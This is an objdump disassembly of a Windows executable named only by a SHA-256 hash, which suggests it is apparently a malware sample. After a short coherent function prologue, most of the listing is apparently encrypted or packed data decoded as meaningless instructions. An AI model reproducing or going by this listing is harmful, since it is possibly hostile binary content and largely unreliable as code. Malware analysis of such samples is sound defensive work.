
538358de52410558f5c350bdc65a3eaff908552c24136d7f56a22a55637165f2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	push   ebx
  401007:	mov    DWORD PTR [ebp-0x48],0x0
  40100e:	mov    DWORD PTR [ebp-0x18],0x0
  401015:	mov    DWORD PTR [ebp-0x70],0x0
  40101c:	mov    DWORD PTR [ebp-0x60],0x0
  401023:	mov    DWORD PTR [ebp-0x8],0x0
  40102a:	mov    DWORD PTR [ebp-0x6c],0x0
  401031:	mov    DWORD PTR [ebp-0x68],0x0
  401038:	mov    DWORD PTR [ebp-0x14],0x0
  40103f:	mov    DWORD PTR [ebp-0x4c],0x0
  401046:	mov    DWORD PTR [ebp-0x10],0x0
  40104d:	mov    DWORD PTR [ebp-0x58],0x0
  401054:	mov    DWORD PTR [ebp-0x4],0x0
  40105b:	mov    DWORD PTR [ebp-0x5c],0x0
  401062:	mov    DWORD PTR [ebp-0x30],0x0
  401069:	mov    DWORD PTR [ebp-0x54],0x0
  401070:	mov    DWORD PTR [ebp-0x2c],0x0
  401077:	mov    DWORD PTR [ebp-0x50],0x0
  40107e:	mov    DWORD PTR [ebp-0xc],0x0
  401085:	mov    eax,ds:0x449e08
  40108a:	mov    DWORD PTR [ebp-0x28],eax
  40108d:	mov    ecx,DWORD PTR ds:0x449e0c
  401093:	mov    DWORD PTR [ebp-0x24],ecx
  401096:	mov    edx,DWORD PTR ds:0x449e10
  40109c:	mov    DWORD PTR [ebp-0x20],edx
  40109f:	mov    al,ds:0x449e14
  4010a4:	mov    BYTE PTR [ebp-0x1c],al
  4010a7:	mov    ecx,DWORD PTR ds:0x449e18
  4010ad:	mov    DWORD PTR [ebp-0x40],ecx
  4010b0:	mov    edx,DWORD PTR ds:0x449e1c
  4010b6:	mov    DWORD PTR [ebp-0x3c],edx
  4010b9:	mov    eax,ds:0x449e20
  4010be:	mov    DWORD PTR [ebp-0x38],eax
  4010c1:	mov    cx,WORD PTR ds:0x449e24
  4010c8:	mov    WORD PTR [ebp-0x34],cx
  4010cc:	mov    dl,BYTE PTR ds:0x449e26
  4010d2:	mov    BYTE PTR [ebp-0x32],dl
  4010d5:	mov    DWORD PTR [ebp-0x30],0x40
  4010dc:	lea    eax,[ebp-0x40]
  4010df:	push   eax
  4010e0:	lea    ecx,[ebp-0x10]
  4010e3:	push   ecx
  4010e4:	call   DWORD PTR ds:0x418000
  4010ea:	test   eax,eax
  4010ec:	je     0x4167b5
  4010f2:	mov    edx,DWORD PTR [ebp-0x10]
  4010f5:	add    edx,0x1
  4010f8:	mov    DWORD PTR [ebp-0x10],edx
  4010fb:	xor    eax,0x67f84b7a
  401100:	sbb    DWORD PTR [ecx],esp
  401102:	or     ebx,DWORD PTR [eax+0x4]
  401105:	retf   
  401106:	add    al,0x93
  401108:	mov    al,ds:0x29d1a6de
  40110d:	inc    ebp
  40110e:	push   ecx
  40110f:	push   ebp
  401110:	enter  0x18c4,0x30
  401114:	xchg   ecx,eax
  401115:	or     DWORD PTR [esi+0x4280cf1a],0xffffffc8
  40111c:	hlt    
  40111d:	push   eax
  40111e:	mov    cl,0xbd
  401120:	dec    ecx
  401121:	xchg   ecx,eax
  401122:	cs pop esp
  401124:	push   0xffffff86
  401126:	push   ebp
  401127:	fnstsw WORD PTR [edx+0x39]
  40112a:	jbe    0x401177
  40112c:	and    BYTE PTR [ebx-0x18944a48],ah
  401132:	test   al,0x8e
  401134:	fnstenv [edi-0x3d2e36ba]
  40113a:	add    eax,0x733528df
  40113f:	call   DWORD PTR ds:0x155fe485
  401145:	les    esp,FWORD PTR [eax+ebp*2-0xc]
  401149:	ins    DWORD PTR es:[edi],dx
  40114a:	push   esp
  40114b:	xchg   ebx,eax
  40114c:	out    dx,al
  40114d:	pop    eax
  40114e:	inc    ecx
  40114f:	repz ja 0x401164
  401152:	repz pop ecx
  401154:	push   cs
  401155:	mov    eax,ds:0x5f39a866
  40115a:	cmp    esp,0x1b1feb70
  401160:	dec    eax
  401161:	fcom   DWORD PTR [edx-0x147a5b8b]
  401167:	and    ecx,DWORD PTR [ebp+0x308c3cf3]
  40116d:	aas    
  40116e:	adc    ebp,ecx
  401170:	xchg   ebp,eax
  401171:	push   ss
  401172:	(bad)  
  401173:	dec    ecx
  401174:	fdivrp st(2),st
  401176:	inc    eax
  401177:	dec    esp
  401178:	dec    ecx
  401179:	fst    DWORD PTR [ebp-0x1b]
  40117c:	adc    dl,cl
  40117e:	fisub  DWORD PTR [ebx-0x71c24069]
  401184:	in     eax,0xdc
  401186:	and    eax,DWORD PTR [edi+0x51]
  401189:	and    dh,BYTE PTR ds:0xa787913c
  40118f:	retf   
  401190:	(bad)
  401193:	and    BYTE PTR [esi],cl
  401195:	add    DWORD PTR [edx+esi*4-0x1eebd772],eax
  40119c:	inc    ecx
  40119d:	pop    esi
  40119e:	jbe    0x401124
  4011a0:	jg     0x40114e
  4011a2:	ss pop edi
  4011a4:	repz mov esp,0x2a9dec13
  4011aa:	xchg   edi,eax
  4011ab:	mov    ebx,0xb6604239
  4011b0:	push   eax
  4011b1:	aad    0xb2
  4011b3:	aad    0xc
  4011b5:	add    dl,BYTE PTR [edi]
  4011b7:	cwde   
  4011b8:	stc    
  4011b9:	cwde   
  4011ba:	es in  al,0xf3
  4011bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011be:	mov    bl,0xbd
  4011c0:	dec    edx
  4011c1:	xor    esp,DWORD PTR ds:0xfc61433b
  4011c7:	mov    edi,0xea866d59
  4011cc:	in     eax,0x2c
  4011ce:	jnp    0x4011cf
  4011d0:	xor    edi,ecx
  4011d2:	add    al,0xca
  4011d4:	inc    eax
  4011d5:	(bad)  
  4011d6:	fidiv  WORD PTR [edi+0x4cd5b911]
  4011dc:	and    eax,0xe68daf3c
  4011e1:	nop
  4011e2:	mov    DWORD PTR [ecx-0x31],esp
  4011e5:	inc    ecx
  4011e6:	mov    ebx,0x1b0043d3
  4011eb:	xor    DWORD PTR [esp+eiz*2+0x73],esp
  4011ef:	mov    bl,0x8e
  4011f1:	mov    bl,bh
  4011f3:	shl    ebx,cl
  4011f5:	mov    ebx,DWORD PTR [edx+0x2b77508a]
  4011fb:	cwde   
  4011fc:	aad    0x67
  4011fe:	dec    esi
  4011ff:	pop    esi
  401200:	loopne 0x40119b
  401202:	or     eax,0x18019591
  401207:	xchg   BYTE PTR [edi],al
  401209:	mov    BYTE PTR [edi],ah
  40120b:	mov    eax,ds:0xe637729e
  401210:	inc    esp
  401211:	mov    ds:0x9cfeda39,al
  401216:	dec    eax
  401217:	mov    esp,0x1c671eed
  40121c:	add    ebp,DWORD PTR [ebp+0x18]
  40121f:	sub    BYTE PTR ds:0x8215f940,0x8b
  401226:	loop   0x40126a
  401228:	ficom  WORD PTR [esp+edx*2]
  40122b:	jmp    0x2566:0x59f01d2d
  401232:	aaa    
  401233:	mov    esp,0xba7fb8f1
  401238:	aam    0x5a
  40123a:	push   esi
  40123b:	test   DWORD PTR [edx+eax*1-0x6a0ec8bb],edi
  401242:	jmp    0xe74e2907
  401247:	dec    ebp
  401248:	or     eax,DWORD PTR [ebx-0x4004bc42]
  40124e:	inc    edx
  40124f:	adc    DWORD PTR [esi],edi
  401251:	adc    eax,0x8213cdd0
  401256:	push   ecx
  401257:	fisubr WORD PTR [eax]
  401259:	loopne 0x401291
  40125b:	stos   DWORD PTR es:[edi],eax
  40125c:	cmovns ecx,DWORD PTR [esi]
  40125f:	xor    DWORD PTR [ebx+0x69],ecx
  401262:	adc    ah,BYTE PTR [eax+0x3d]
  401265:	ds adc ebx,ebp
  401268:	adc    eax,0x3f14306e
  40126d:	sub    eax,0x55aa7ee7
  401272:	aaa    
  401273:	in     al,0x6c
  401275:	jp     0x40127c
  401277:	sub    al,0x8b
  401279:	test   BYTE PTR [ecx+eax*8+0x105d9cde],dh
  401280:	jmp    0x401225
  401282:	wrmsr  
  401284:	dec    esi
  401285:	inc    esp
  401286:	pushf  
  401287:	sbb    ecx,esi
  401289:	popf   
  40128a:	push   esp
  40128b:	pop    ss
  40128c:	xlat   BYTE PTR ds:[ebx]
  40128d:	mov    ch,0x92
  40128f:	xchg   ch,cl
  401291:	repnz sahf 
  401293:	xchg   ebx,eax
  401294:	imul   edi,ebx,0x55a6f31b
  40129a:	jle    0x401268
  40129c:	xor    DWORD PTR [edi-0x20],0xfffffff2
  4012a0:	adc    esp,ebx
  4012a2:	imul   DWORD PTR [ebp-0x51ae2d1d]
  4012a8:	loop   0x40130c
  4012aa:	mov    DWORD PTR [eax-0x48],ecx
  4012ad:	and    dh,BYTE PTR [ebp-0x18dd8466]
  4012b3:	push   esi
  4012b4:	mov    al,0xe8
  4012b6:	arpl   WORD PTR [edx+0x890778f],bp
  4012bc:	hlt    
  4012bd:	int    0x61
  4012bf:	scas   al,BYTE PTR es:[edi]
  4012c0:	jecxz  0x40132f
  4012c2:	mov    BYTE PTR [edx],dh
  4012c4:	mov    dl,0x66
  4012c6:	adc    al,0x89
  4012c8:	xor    dl,BYTE PTR [edi+0x5e9b204f]
  4012ce:	add    al,ah
  4012d0:	push   esp
  4012d1:	lods   al,BYTE PTR ds:[esi]
  4012d2:	mov    ah,0x92
  4012d4:	xor    BYTE PTR [ebp-0xf],ah
  4012d7:	mov    esi,0xfad09f31
  4012dc:	repz call 0x7b0:0x89d9823
  4012e4:	xchg   DWORD PTR [ebx],ebp
  4012e6:	mov    dl,0xac
  4012e8:	jmp    0x97d1:0xf0a714cf
  4012ef:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4012f1:	push   ebx
  4012f2:	jmp    DWORD PTR [edi-0x6df64bc8]
  4012f8:	xchg   esp,eax
  4012f9:	not    BYTE PTR [edx]
  4012fb:	test   DWORD PTR [edx+0x7075566f],esi
  401301:	mov    al,ds:0xd2bc29e1
  401306:	dec    ebp
  401307:	jp     0x40133c
  401309:	pmulhw mm2,QWORD PTR [ebx-0x7]
  40130d:	or     DWORD PTR [ecx-0x22],edx
  401310:	xlat   BYTE PTR ds:[ebx]
  401311:	into   
  401312:	mov    ebx,0x7ec3a0
  401317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401318:	ret    
  401319:	add    dh,0x53
  40131c:	fisttp QWORD PTR ds:0x48ee9afb
  401322:	cmp    al,0x8
  401324:	sub    DWORD PTR [edx],eax
  401326:	adc    bh,ah
  401328:	shr    BYTE PTR [eax],1
  40132a:	int3   
  40132b:	pop    edx
  40132c:	out    dx,al
  40132d:	sti    
  40132e:	lock or al,0xaa
  401331:	push   ds
  401332:	mov    edx,DWORD PTR [edi-0x11]
  401335:	mov    esp,0xeaf675fb
  40133a:	or     edi,ecx
  40133c:	cdq    
  40133d:	adc    eax,0x31c8ab4a
  401342:	cld    
  401343:	popw   ds
  401345:	cmp    DWORD PTR [edi+edx*4-0x79d5e41b],edx
  40134c:	jl     0x401351
  40134e:	pop    esp
  40134f:	pop    eax
  401350:	call   0xf188:0x4b87d6fa
  401357:	loop   0x401313
  401359:	inc    edx
  40135a:	(bad)  [ecx-0x70]
  40135d:	js     0x4012f9
  40135f:	mov    bl,0xb
  401361:	sbb    bl,BYTE PTR [ebx+0x40d6c2fb]
  401367:	sbb    al,BYTE PTR [ebp+0x841f46f]
  40136d:	mov    ebp,0x63fcf17c
  401372:	mov    edi,0x399a036c
  401377:	mov    esp,0x68b348c6
  40137c:	cmp    edx,DWORD PTR [esi-0x74]
  40137f:	add    eax,0x197907e8
  401384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401385:	not    DWORD PTR [edi]
  401387:	pop    ecx
  401388:	scas   al,BYTE PTR es:[edi]
  401389:	nop
  40138a:	mov    ecx,0xe10b664e
  40138f:	sub    esi,DWORD PTR [edi-0x78]
  401392:	add    ch,BYTE PTR [edi+0x4e]
  401395:	sbb    dh,cl
  401397:	push   0x2041da8d
  40139c:	mov    edx,0x5625715a
  4013a1:	mov    cl,0xf2
  4013a3:	gs add al,0x47
  4013a6:	repz xchg esp,eax
  4013a8:	lea    edi,[ebx]
  4013aa:	sub    DWORD PTR [ebp-0x656f1c7a],ebx
  4013b0:	loopne 0x4013d1
  4013b2:	jg     0x40133f
  4013b4:	sub    esi,ebp
  4013b6:	or     eax,0x16a2001a
  4013bb:	inc    ebp
  4013bc:	pop    DWORD PTR [eax]
  4013be:	outs   dx,BYTE PTR ds:[esi]
  4013bf:	jge    0x4013d3
  4013c1:	in     eax,0x15
  4013c3:	ror    DWORD PTR [edx],0xf0
  4013c6:	xchg   esi,eax
  4013c7:	dec    edi
  4013c8:	scas   eax,DWORD PTR es:[edi]
  4013c9:	(bad)  
  4013cb:	inc    edi
  4013cc:	and    ah,BYTE PTR ds:0x8f4281b5
  4013d2:	lock loop 0x4013d5
  4013d5:	lahf   
  4013d6:	mov    cs,WORD PTR ds:0xd6a1dc49
  4013dc:	(bad)  
  4013dd:	mov    esp,0xec3f6630
  4013e2:	das    
  4013e3:	add    eax,0xb0dac16d
  4013e8:	mov    ds:0xf19f5329,eax
  4013ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013ee:	nop
  4013ef:	test   DWORD PTR [edx],edi
  4013f1:	adc    al,0xbe
  4013f3:	arpl   WORD PTR [ebx],si
  4013f5:	push   0x64110215
  4013fa:	fist   WORD PTR [esi+0x43]
  4013fd:	lds    ecx,FWORD PTR [ebp+0x64]
  401400:	add    esi,ebp
  401402:	mov    ah,0x12
  401404:	popa   
  401405:	loop   0x4013ae
  401407:	je     0x4013ab
  401409:	or     DWORD PTR [ebx+0xd32651a],edi
  40140f:	or     eax,0xbb1844a7
  401414:	std    
  401415:	xor    eax,0xa2b780a5
  40141a:	jge    0x401421
  40141c:	inc    eax
  40141d:	ins    BYTE PTR es:[edi],dx
  40141e:	mov    ah,0x24
  401420:	sub    eax,0x8b9ad77f
  401425:	lods   al,BYTE PTR ds:[esi]
  401426:	pop    es
  401427:	xchg   edx,eax
  401428:	retf   0x8e3f
  40142b:	(bad)  
  40142d:	rcr    DWORD PTR [edi],0x56
  401430:	mov    esp,0xcfe2126b
  401435:	jbe    0x401425
  401437:	fmul   st,st(7)
  401439:	pop    eax
  40143a:	aam    0x4b
  40143c:	imul   edx,DWORD PTR [esp+edi*1],0xffffffbf
  401440:	jmp    0x3bf8:0x16fb82c2
  401447:	cmp    DWORD PTR [esi+0x1676a89d],edi
  40144d:	xor    ecx,DWORD PTR [eax-0x72]
  401450:	cdq    
  401451:	in     eax,0xef
  401453:	pop    esp
  401454:	or     al,0x5a
  401456:	push   esi
  401457:	pusha  
  401458:	iret   
  401459:	lds    esp,FWORD PTR [edi]
  40145b:	scas   eax,DWORD PTR es:[edi]
  40145c:	int3   
  40145d:	jns    0x4014b4
  40145f:	xor    DWORD PTR [ebp+0x67],0x12c4395e
  401466:	fldenv ds:0x44ead418
  40146c:	inc    ecx
  40146d:	pop    ebx
  40146e:	pop    edi
  40146f:	div    DWORD PTR [edi+0x7f29a8e3]
  401475:	xchg   esp,eax
  401476:	and    eax,0xc9056d3b
  40147b:	jns    0x4014e8
  40147d:	sbb    DWORD PTR [ecx+0x15],0xff677f24
  401484:	das    
  401485:	mov    al,ds:0x6dca1b32
  40148a:	int    0x1b
  40148c:	loop   0x401507
  40148e:	pop    edi
  40148f:	inc    edx
  401490:	xchg   ecx,eax
  401491:	adc    al,0x87
  401493:	ror    ch,0xec
  401496:	sbb    BYTE PTR [ebp-0x4c],bh
  401499:	pop    ecx
  40149a:	jl     0x401452
  40149c:	dec    eax
  40149d:	pop    eax
  40149e:	mov    cr7,ebx
  4014a1:	nop
  4014a2:	cwde   
  4014a3:	mov    ?,WORD PTR [edx-0x74]
  4014a6:	popa   
  4014a7:	add    edx,DWORD PTR [edi+0x3f]
  4014aa:	jg     0x40148a
  4014ac:	jns    0x4014d4
  4014ae:	pop    ds
  4014af:	aam    0xf7
  4014b1:	jecxz  0x4014bd
  4014b3:	dec    edx
  4014b4:	cmp    BYTE PTR [edi-0x246f62b6],cl
  4014ba:	(bad)
  4014bd:	or     al,0xb5
  4014bf:	cs xchg eax,esi
  4014c2:	jmp    0xfaf0:0x884b79b3
  4014c9:	scas   eax,DWORD PTR es:[edi]
  4014ca:	ret    
  4014cb:	retf   
  4014cc:	pop    esi
  4014cd:	out    0xdd,eax
  4014cf:	in     eax,0xf9
  4014d1:	addr16 out 0x4d,al
  4014d4:	js     0x4014b8
  4014d6:	test   DWORD PTR [esi],ecx
  4014d8:	jns    0x401495
  4014da:	add    eax,0xb5c9e789
  4014df:	and    al,0x62
  4014e1:	call   0x9842:0xdda5256e
  4014e8:	jns    0x40146b
  4014ea:	(bad)  
  4014ec:	mov    ebp,0xd72dcc8
  4014f1:	pop    ss
  4014f2:	adc    BYTE PTR [eax+0x34],cl
  4014f5:	pop    eax
  4014f6:	xchg   ebp,eax
  4014f7:	retf   0x76dc
  4014fa:	(bad)  
  4014fb:	arpl   sp,si
  4014fd:	loop   0x401534
  4014ff:	adc    bl,dl
  401501:	dec    edi
  401502:	and    eax,0xd4b06758
  401507:	rcl    ch,0x10
  40150a:	ds cmp al,0x8b
  40150d:	cmp    cl,al
  40150f:	mov    dh,bl
  401511:	mov    dl,0x12
  401513:	mov    ds:0xe9288bcc,eax
  401518:	mov    bl,0x46
  40151a:	call   DWORD PTR [edx+esi*2]
  40151d:	jmp    0x15552e79
  401522:	and    DWORD PTR [ecx+ebx*8],ebx
  401525:	mov    al,0x5d
  401527:	pop    ss
  401528:	dec    esp
  401529:	mov    edx,0xfa730664
  40152e:	rcr    DWORD PTR [edx],1
  401530:	cmp    ebx,ecx
  401532:	jb     0x401558
  401534:	add    al,ah
  401536:	adc    ebx,DWORD PTR [ebp+0x33]
  401539:	imul   esi,DWORD PTR [edx+0x66],0x8cbdb4be
  401540:	mov    eax,ds:0x1f8c0b8b
  401545:	daa    
  401546:	out    0x34,al
  401548:	cmp    DWORD PTR [eax-0x359fb87],esi
  40154e:	std    
  40154f:	ret    0x6072
  401552:	jne    0x4014f3
  401554:	xor    DWORD PTR [edx],edi
  401556:	pop    edi
  401557:	sbb    BYTE PTR [ebx-0x3879f53c],0xca
  40155e:	mov    ds:0x1c619b7d,al
  401563:	into   
  401564:	idiv   DWORD PTR [edx]
  401566:	adc    dh,dh
  401568:	jge    0x40155a
  40156a:	test   BYTE PTR [ebx-0x362991aa],bl
  401570:	imul   eax,esi,0xbf734bc
  401576:	sar    BYTE PTR [esi-0x6440b2ce],1
  40157c:	inc    esp
  40157d:	repnz outs dx,DWORD PTR ds:[esi]
  40157f:	scas   eax,DWORD PTR es:[edi]
  401580:	shr    BYTE PTR [edi],0x23
  401583:	call   0x294f:0x56a6fa47
  40158a:	push   ebp
  40158b:	push   ebp
  40158c:	push   eax
  40158d:	inc    esi
  40158e:	cmp    al,0xfe
  401590:	mov    cs,WORD PTR [eax]
  401592:	aad    0x39
  401594:	jle    0x401586
  401596:	and    esi,DWORD PTR [ebp+0x77]
  401599:	fwait
  40159a:	pop    esp
  40159b:	clc    
  40159c:	cld    
  40159d:	scas   eax,DWORD PTR es:[edi]
  40159e:	adc    DWORD PTR [edx+eiz*8],eax
  4015a1:	add    ch,dl
  4015a3:	add    al,0x7f
  4015a5:	cld    
  4015a6:	imul   edx,DWORD PTR [esi-0x13],0x28e2709a
  4015ad:	test   DWORD PTR [edx+0x3c],ecx
  4015b0:	rol    DWORD PTR [edx+0x1cc46b2e],1
  4015b6:	dec    esp
  4015b7:	sahf   
  4015b8:	sbb    DWORD PTR [ebx-0x1b],edi
  4015bb:	push   0x3d
  4015bd:	in     al,dx
  4015be:	mov    esp,0xb3ee6efa
  4015c3:	dec    ebx
  4015c4:	scas   eax,DWORD PTR es:[edi]
  4015c5:	mov    esi,0x867de0f7
  4015ca:	sub    ebp,DWORD PTR [esi+0xe937e1c]
  4015d0:	ret    0x7684
  4015d3:	xchg   ebx,eax
  4015d4:	in     al,0x82
  4015d6:	pop    esi
  4015d7:	adc    dl,BYTE PTR [edi+eiz*4]
  4015da:	imul   esi,DWORD PTR [edx-0x4a],0xfffffffc
  4015de:	fnstcw WORD PTR [ebx+ecx*1+0x45f21425]
  4015e5:	push   0x7ada2cb7
  4015ea:	or     BYTE PTR [ecx+eax*8+0x3],0x0
  4015ef:	pop    ebp
  4015f0:	sub    ch,BYTE PTR [ebx]
  4015f2:	jg     0x40161b
  4015f4:	and    DWORD PTR [esi],edx
  4015f6:	(bad)  
  4015f7:	(bad)  
  4015f8:	loop   0x40163a
  4015fa:	inc    ebp
  4015fb:	or     al,0xdb
  4015fd:	(bad)  
  4015ff:	cwde   
  401600:	sub    ebp,DWORD PTR [ebp+ebx*4+0x6ab6e0b4]
  401607:	ins    DWORD PTR es:[edi],dx
  401608:	inc    esp
  401609:	into   
  40160a:	les    esp,FWORD PTR [edi+0x7adcfb96]
  401610:	push   edx
  401611:	(bad)  
  401612:	jmp    FWORD PTR [ebx-0x425bdc5d]
  401618:	xchg   ebp,eax
  401619:	or     al,0x54
  40161b:	push   edi
  40161c:	add    al,0x58
  40161e:	sahf   
  40161f:	fst    DWORD PTR [eax]
  401621:	ret    0xaa74
  401624:	push   esp
  401625:	out    dx,eax
  401626:	push   esp
  401627:	in     al,0x1d
  401629:	mov    eax,ds:0xd4e196ee
  40162e:	jae    0x401612
  401630:	xchg   esi,eax
  401631:	xchg   ebp,eax
  401632:	ins    DWORD PTR es:[edi],dx
  401633:	xor    ebp,ebx
  401635:	and    eax,0x9977d895
  40163a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40163b:	and    DWORD PTR [ebx],0xfffffffc
  40163e:	push   eax
  40163f:	pop    ebx
  401640:	int    0x84
  401642:	xchg   ebx,eax
  401643:	add    al,0x52
  401645:	call   0xa4429b59
  40164a:	hlt    
  40164b:	sahf   
  40164c:	or     ch,BYTE PTR [ebx-0x2a03c529]
  401652:	outs   dx,BYTE PTR ds:[esi]
  401653:	sub    BYTE PTR [esi-0x5f],ch
  401656:	push   ebp
  401657:	aaa    
  401658:	popf   
  401659:	cmp    dl,BYTE PTR [ecx-0x3615e37]
  40165f:	mov    bh,0x39
  401661:	xchg   ebx,eax
  401662:	test   BYTE PTR [ecx],cl
  401664:	lds    edi,FWORD PTR [eax+0x1e]
  401667:	dec    ecx
  401668:	mov    eax,gs
  40166a:	jecxz  0x401633
  40166c:	pop    edx
  40166d:	mov    ds:0x24415a0f,eax
  401672:	cmp    ebx,edi
  401674:	inc    ebx
  401675:	pop    ss
  401676:	stos   BYTE PTR es:[edi],al
  401677:	outs   dx,DWORD PTR ds:[esi]
  401678:	data16 jno 0x4016ce
  40167b:	and    al,0xff
  40167d:	pusha  
  40167e:	push   es
  40167f:	mov    esi,0x344f0388
  401684:	test   eax,0xd759dbb0
  401689:	mov    BYTE PTR [eax+0x107e939a],ah
  40168f:	mov    bh,0xef
  401691:	pushw  0xffc9
  401694:	popa   
  401695:	mov    esi,0x577a2749
  40169a:	je     0x401660
  40169c:	stos   DWORD PTR es:[edi],eax
  40169d:	mov    ch,bl
  40169f:	or     eax,0x9fbd3051
  4016a4:	mov    ds:0x619cdb7f,eax
  4016a9:	ins    BYTE PTR es:[edi],dx
  4016aa:	sahf   
  4016ab:	mov    esp,0xf559ca39
  4016b0:	push   ebx
  4016b1:	hlt    
  4016b2:	fistp  WORD PTR ds:0x2f6378dc
  4016b8:	js     0x4016d7
  4016ba:	nop
  4016bb:	push   esi
  4016bc:	inc    ecx
  4016bd:	es sbb cl,al
  4016c0:	lahf   
  4016c1:	imul   edx,DWORD PTR [edx-0x11],0x54
  4016c5:	ja     0x401652
  4016c7:	shl    BYTE PTR [esi-0x31e7a499],0x19
  4016ce:	stos   BYTE PTR es:[edi],al
  4016cf:	push   esp
  4016d0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016d2:	add    eax,0x3231e8c0
  4016d7:	adc    al,0xac
  4016d9:	cmp    DWORD PTR [eax-0x391300d],ebp
  4016df:	push   ss
  4016e0:	inc    eax
  4016e1:	and    eax,0x78b0e81e
  4016e6:	imul   eax,DWORD PTR [esi-0x4],0x64
  4016ea:	xchg   ebx,eax
  4016eb:	jle    0x4016f1
  4016ed:	(bad)  
  4016ee:	add    ecx,esp
  4016f0:	inc    eax
  4016f1:	imul   ebx,DWORD PTR [esi],0x3a
  4016f4:	add    edi,DWORD PTR [edi]
  4016f6:	xchg   BYTE PTR [esi-0x640c5ff],bl
  4016fc:	xor    bh,cl
  4016fe:	dec    ebp
  4016ff:	fcomip st,st(2)
  401701:	scas   al,BYTE PTR es:[edi]
  401702:	mov    al,ds:0xd4c9af1c
  401707:	mov    eax,0xc54363b5
  40170c:	out    dx,eax
  40170d:	pop    ds
  40170e:	out    0x88,al
  401710:	sti    
  401711:	ins    BYTE PTR es:[edi],dx
  401712:	aas    
  401713:	jnp    0x401698
  401715:	jne    0x4016dc
  401717:	mov    ah,0xc1
  401719:	in     eax,0xfa
  40171b:	scas   eax,DWORD PTR es:[edi]
  40171c:	int3   
  40171d:	sub    BYTE PTR [ecx],bl
  40171f:	stos   DWORD PTR es:[edi],eax
  401720:	xor    al,0x94
  401722:	mov    edx,0xac2c9097
  401727:	jecxz  0x4016e5
  401729:	push   edi
  40172a:	loope  0x4016d3
  40172c:	sbb    BYTE PTR [edi],dh
  40172e:	int    0x8a
  401730:	adc    ebp,DWORD PTR [ebp-0x3]
  401733:	mov    al,0xe8
  401735:	clc    
  401736:	mov    ebp,0xd9913be3
  40173b:	cld    
  40173c:	mov    al,ds:0xcc0bd59d
  401741:	pop    edi
  401742:	jne    0x4016e1
  401744:	dec    edi
  401745:	out    dx,eax
  401746:	xor    BYTE PTR [ebx+0x5],ah
  401749:	dec    edx
  40174a:	loop   0x401702
  40174c:	xchg   esp,eax
  40174d:	mov    edx,0x9069428d
  401752:	daa    
  401753:	xor    ebx,DWORD PTR [esi-0x29aad37e]
  401759:	out    0x95,al
  40175b:	xlat   BYTE PTR ds:[ebx]
  40175c:	fisttp WORD PTR [ebp-0x59]
  40175f:	aad    0xe
  401761:	inc    edi
  401762:	adc    BYTE PTR [edi],0x6e
  401765:	addr16 pop ecx
  401767:	inc    ebx
  401768:	xchg   ebp,eax
  401769:	push   esp
  40176a:	lods   eax,DWORD PTR ds:[esi]
  40176b:	fimul  DWORD PTR [ecx+esi*4+0x3aaf8dc7]
  401772:	mov    ebx,0xe1f1b317
  401777:	xchg   ebx,eax
  401778:	mov    ch,0xfd
  40177a:	pop    ebx
  40177b:	push   ebx
  40177c:	dec    edx
  40177d:	mov    dh,ch
  40177f:	cld    
  401780:	adc    edi,DWORD PTR [edi]
  401782:	sbb    ch,cl
  401784:	cli    
  401785:	xchg   ebx,eax
  401786:	test   BYTE PTR [ecx-0x262d9dc4],0x6f
  40178d:	je     0x401798
  40178f:	pop    ds
  401790:	call   FWORD PTR [ecx-0x5984d169]
  401796:	mov    ecx,0x15daa379
  40179b:	add    bl,BYTE PTR [edi+0x54]
  40179e:	dec    edx
  40179f:	stos   BYTE PTR es:[edi],al
  4017a0:	sub    DWORD PTR [ebp+0x71],ebp
  4017a3:	mov    ebp,0x69ee7386
  4017a8:	bound  ebp,QWORD PTR [edi+0x5b]
  4017ab:	inc    esi
  4017ac:	pop    edx
  4017ad:	dec    edi
  4017ae:	pop    esp
  4017af:	in     eax,0x5f
  4017b1:	lea    ebx,[ebx]
  4017b3:	fnstsw ax
  4017b5:	repnz inc edi
  4017b7:	(bad)  
  4017b8:	icebp  
  4017b9:	xchg   edx,eax
  4017ba:	xchg   edi,eax
  4017bb:	add    ecx,DWORD PTR ds:0xad38aa50
  4017c1:	and    eax,0x500d0973
  4017c6:	inc    esp
  4017c7:	dec    dx
  4017c9:	sbb    BYTE PTR [edi],ch
  4017cb:	(bad)  
  4017cc:	ror    BYTE PTR [esi-0x73d08cfc],0x15
  4017d3:	fild   QWORD PTR [eax+edx*4-0x38abfc03]
  4017da:	jno    0x40179e
  4017dc:	xchg   esp,eax
  4017dd:	retf   0xd1f4
  4017e0:	imul   esp,eax,0x77
  4017e3:	dec    eax
  4017e4:	ret    0x7030
  4017e7:	pop    ss
  4017e8:	cmp    DWORD PTR [edx],edi
  4017ea:	mul    DWORD PTR es:[esi+0x66]
  4017ee:	mov    bl,0xf7
  4017f0:	or     DWORD PTR [edx-0x5d],0x4bdcd700
  4017f7:	and    BYTE PTR [ebx+0x2],0x32
  4017fb:	cmp    al,0xb7
  4017fd:	std    
  4017fe:	sbb    cl,BYTE PTR [edx+edx*8]
  401801:	rcr    DWORD PTR [ebx],0xc9
  401804:	arpl   WORD PTR [esp+edx*1],bx
  401807:	mov    ds:0x23435d9d,al
  40180c:	adc    ch,BYTE PTR [eax+ebp*1+0x3148e4b5]
  401813:	and    DWORD PTR [esi+0x3abfc5a6],edx
  401819:	mov    ebp,0x33a00f29
  40181e:	aaa    
  40181f:	(bad)  
  401821:	leave  
  401822:	xor    esp,edi
  401824:	cmp    dh,BYTE PTR [ebp+0x571bb44]
  40182a:	mov    esp,0xe7c51cb6
  40182f:	cmp    eax,0xda93fb51
  401834:	push   es
  401835:	test   eax,0x77528c78
  40183a:	push   es
  40183b:	repnz sbb bh,ch
  40183e:	adc    eax,0xb3d906fe
  401843:	(bad)  
  401844:	in     al,dx
  401845:	shr    esp,0x9a
  401848:	and    DWORD PTR [esi-0x32],eax
  40184b:	lahf   
  40184c:	cmp    DWORD PTR [ebp+0x23303bcd],ecx
  401852:	jp     0x4018ad
  401854:	sar    BYTE PTR [edx+0x56cd5314],0xf2
  40185b:	lods   eax,DWORD PTR ds:[esi]
